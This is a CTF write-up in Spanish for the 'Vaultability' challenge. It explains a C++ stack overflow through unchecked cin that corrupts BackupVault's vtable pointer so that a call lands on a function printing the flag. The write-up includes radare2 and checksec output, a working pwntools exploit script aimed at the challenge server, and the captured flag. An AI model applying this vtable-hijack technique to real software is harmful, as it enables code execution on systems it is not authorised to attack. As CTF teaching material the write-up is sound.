# Vaultability

Datos:

- Nos dan el codigo fuente escrito en C++, donde hay dos objetos: Vault y BackupVault, BackupVault hereda los metodos virtuales `showSecurityLog` y `triggerAllarm` de Vault:

```
class Vault {
    char pin[16];

  public:
    virtual void enterPin() {
        cout << "Enter Vault PIN: ";
        cin >> pin;
    }
    virtual void showSecurityLog() { cout << &pin << endl; }
    virtual void triggerAlarm() { cout << "Security Breach Detected!" << endl; }
};

class BackupVault : public Vault {
    char pin[16];

  public:
    void enterPin() {
        cout << "Enter Backup Vault PIN: ";
        cin >> pin;
    }
};
```

- Entre las opciones que tenemos en el programa, podemos en ambos vaults escribir un codigo PIN de hasta 16 bytes, ver la direccion en el stack de estos valores y mostrar un mensaje de alerta:

``` c++
int menu(Vault *vault, Vault *backup) {
    cout << "1. Enter Vault PIN" << endl;
    cout << "2. View Security Log" << endl;
    cout << "3. Trigger Alarm" << endl;
    cout << "4. Enter Backup Vault PIN" << endl;
    cout << "5. View Backup Vault Log" << endl;
    cout << "6. Trigger Backup Vault Alarm" << endl;
    cout << "7. Exit" << endl;
    cout << "Enter your choice: ";

    int choice;
    cin >> choice;

    switch (choice) {
    case 1:
        vault->enterPin();
        break;
    case 2:
        vault->showSecurityLog();
        break;
```

- Existe una funcion `void secretAccess() { system("cat flag.txt"); }` , a la que debemos llegar

- La entrada de usuario se produce por el metodo `cin`, que no valida la entrada, permitiendonos escribir mas de lo esperado

- Viendo las propiedades del ejecutable, este no tiene PIE, asi que las direcciones de memoria del binario son fijas:
```
checksec --file=main
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH    Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   66 Symbols        No    0               0               main
```

## VTables 
Una VTable (tabla virtual o tabla de métodos virtuales) es un mecanismo utilizado en programación orientada a objetos, especialmente en lenguajes como C++, para implementar el polimorfismo dinámico (también llamado polimorfismo por herencia).

Es una tabla que contiene punteros a las funciones virtuales de una clase, las vtables lucen como direcciones contiguas de memoria que apuntan a los metodos virtuales:
```
 ;-- vtable.BackupVault.0:
            ; DATA XREF from BackupVault::BackupVault() @ 0x401650(r)
            0x00403d88      .qword 0x00000000004015d0 ; sym.BackupVault::enterPin__ ; method.BackupVault.enterPin__ ; method.BackupVault.virtual_0
            0x00403d90      .qword 0x0000000000401552 ; sym.Vault::showSecurityLog__ ; method.Vault.showSecurityLog__ ; method.BackupVault.virtual_8 ; method.Vault.virtual_8
            0x00403d98      .qword 0x0000000000401592 ; sym.Vault::triggerAlarm__ ; method.Vault.triggerAlarm__ ; method.BackupVault.virtual_16 ; method.Vault.virtual_16
            ;-- vtable for Vault:
            0x00403da0      .qword 0x0000000000000000                  ; vtable for Vault
[0x00403d88]> pd 5
            ;-- vtable.BackupVault.0:
            ; DATA XREF from BackupVault::BackupVault() @ 0x401650(r)
            0x00403d88      .qword 0x00000000004015d0 ; sym.BackupVault::enterPin__ ; method.BackupVault.enterPin__ ; method.BackupVault.virtual_0
            0x00403d90      .qword 0x0000000000401552 ; sym.Vault::showSecurityLog__ ; method.Vault.showSecurityLog__ ; method.BackupVault.virtual_8 ; method.Vault.virtual_8
            0x00403d98      .qword 0x0000000000401592 ; sym.Vault::triggerAlarm__ ; method.Vault.triggerAlarm__ ; method.BackupVault.virtual_16 ; method.Vault.virtual_16
```

## Corrupcion de la VTable de BackupVault
Nuestra entrada de PIN para Vault podria sobreescribir la referencia a la vtable de BackupVault, tal y como vemos en la pila:
```
0x7ffe3de66e78 0x00000000004014e7 main+71
0x7ffe3de66e80 0x0000000000403db0 vtable.Vault.0
0x7ffe3de66e88 0x0000414141414141                    <-- Entrada de usuario, "AAAAAA"
0x7ffe3de66e90 0x00000000000011ff elf_strtab+3207
0x7ffe3de66e98 0xffffffffffffffa0
0x7ffe3de66ea0 0x0000000000403d88 vtable.BackupVault.0 <-- 24 bytes despues
```

La idea es rellenar estos 24 bytes con una falsa vtable y luego sobreescribir la referencia a la direccion de la pila donde comienza nuestra falsa vtable (el punto donde comenzamos a escribir)

Gracias a que el metodo `View Security Log` de Vault nos permite saber la direccion en el stack donde se almacena nuestra entrada, podemos proceder

- Primero buscamos la direccion de `secretAccess` (que es fija porque el binario no tiene PIE), podemos hacer esto con multiples herramientas pero una que trae Linux por defecto para sacar simbolos es `nm`:
```
nm main| grep secret
00000000004011f6 T _Z12secretAccessv
```

- Luego obtenemos la direccion donde escribimos el PIN, haciendo una peticion a `View Security Log`

- Creamos nuestra carga util, con dos direcciones de relleno y una tercera apuntando a nuestra funcion secretAccess, luego la direccion que obtuvimos de `View Security Log` para reemplazar la referencia:

`carga_util =  16 bytes de cualquier cosa + 0x00000000004011f6 + direccion_de_Vault_PIN_en_el_Stack`

- Por ultimo llamamos a BackupVault_triggerAlarm, que intentara acceder a direccion_de_Vault_PIN_en_el_Stack + 16 bytes, direccion que contiene 0x00000000004011f6, por lo que se ejecutará la funcion maliciosa

## Exploit
```python
from pwn import *
elf = context.binary = ELF("./main")
#io = process('./main')
io = remote("challs.breachers.in",1339)

io.sendlineafter(b"choice: ", b"2")
fake_vtable_addr = p64(int(io.recvline().strip(),16))

fake_vtable = p64(0x41414141) + p64(0x42424242) + p64(0x004011f6)
payload = fake_vtable + fake_vtable_addr

io.sendlineafter(b"choice: ", b"1")
io.sendlineafter(b"PIN: ", payload)
# Al llamar a BackupVault_triggerAllarm esta buscara
io.sendlineafter(b"choice: ", b"6")
print(io.recv())
```

```
python3 win.py
[*] Checking for new versions of pwntools
    To disable this functionality, set the contents of /home/kalcast/.cache/.pwntools-cache-3.12/update to 'never' (old way).
    Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide):
        [update]
        interval=never
[*] A newer version of pwntools is available on pypi (4.13.1 --> 4.14.1).
    Update with: $ pip install -U pwntools
[*] '/home/kalcast/Descargas/CTF/Vaultability/main'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[+] Opening connection to challs.breachers.in on port 1339: Done
b'Breach{v74b13_c4113d_f4k3_func}\n'
[*] Closed connection to challs.breachers.in port 1339
```

`Breach{v74b13_c4113d_f4k3_func}`
